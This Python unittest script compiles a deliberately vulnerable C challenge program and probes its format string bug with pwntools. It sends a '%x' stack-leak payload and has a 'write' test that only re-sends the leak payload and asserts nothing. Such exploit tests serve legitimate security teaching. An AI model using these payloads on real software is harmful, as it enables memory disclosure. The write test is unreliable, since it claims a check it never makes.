#!/usr/bin/env python3
"""
Test script for exploiting the format string vulnerability.
"""

import os
import subprocess
import tempfile
import unittest
from pathlib import Path

try:
    from pwn import *
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    print("Pwntools not available. Some tests will be skipped.")

class TestFormatString(unittest.TestCase):
    """Test case for the format string vulnerability."""
    
    @classmethod
    def setUpClass(cls):
        """Compile the vulnerable program before running tests."""
        # Get the directory of this file
        current_dir = Path(__file__).parent
        challenge_dir = current_dir / "challenges"
        
        # Source and binary paths
        cls.source_path = challenge_dir / "format.c"
        cls.binary_path = challenge_dir / "format"
        
        # Compile the vulnerable program
        compile_cmd = [
            "gcc", 
            "-o", str(cls.binary_path), 
            str(cls.source_path)
        ]
        
        try:
            subprocess.run(compile_cmd, check=True)
            print(f"Successfully compiled {cls.binary_path}")
        except subprocess.CalledProcessError as e:
            print(f"Failed to compile: {e}")
            raise
    
    def test_normal_execution(self):
        """Test normal execution of the program."""
        proc = subprocess.Popen(
            [str(self.binary_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate("Hello, World!\n")
        
        self.assertIn("Hello, World!", stdout)
        self.assertIn("Secret value: 0x12345678", stdout)
        self.assertIn("Program completed normally", stdout)
    
    def test_format_string_leak(self):
        """Test leaking memory using format string."""
        # Create a payload that uses format specifiers to leak memory
        payload = "%x %x %x %x\n"
        
        proc = subprocess.Popen(
            [str(self.binary_path)],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proc.communicate(payload)
        
        # Check if we got some hex values leaked
        self.assertRegex(stdout, r'[0-9a-f]+ [0-9a-f]+ [0-9a-f]+ [0-9a-f]+')
        print(f"Leaked values: {stdout.split('Enter some text: ')[1].split('Secret value:')[0].strip()}")
    
    @unittest.skipIf(not PWNTOOLS_AVAILABLE, "Pwntools not available")
    def test_format_string_write(self):
        """Test writing to memory using format string."""
        if not PWNTOOLS_AVAILABLE:
            self.skipTest("Pwntools not available")
        
        # Load the binary with pwntools
        elf = ELF(str(self.binary_path))
        
        # Get the address of the secret_value
        secret_addr = elf.symbols.get('secret_value')
        if not secret_addr:
            # If we can't get it from symbols, we could try to find it another way
            # For this test, we'll just skip if we can't find it
            self.skipTest("Could not find address of secret_value")
        
        print(f"Address of secret_value: {hex(secret_addr)}")
        
        # Create a process
        p = process(str(self.binary_path))
        
        # Receive the prompt
        p.recvuntil(b"Enter some text: ")
        
        # Create a payload that writes 0x41414141 to the secret_value address
        # This is a simplified example and may need adjustment based on the actual binary
        # The exact format string payload depends on the architecture and memory layout
        
        # For demonstration, we'll use a basic format string payload
        # In a real exploit, you would need to calculate the correct offsets
        payload = f"%x %x %x %x\n"
        
        # Send the payload
        p.sendline(payload.encode())
        
        # Receive the output
        output = p.recvall().decode('utf-8', errors='ignore')
        
        # For this test, we're just demonstrating the concept
        # In a real exploit, we would check if we successfully modified the secret_value
        print("Format string payload sent. In a real exploit, we would modify the secret_value.")
        
        p.close()

if __name__ == "__main__":
    unittest.main() 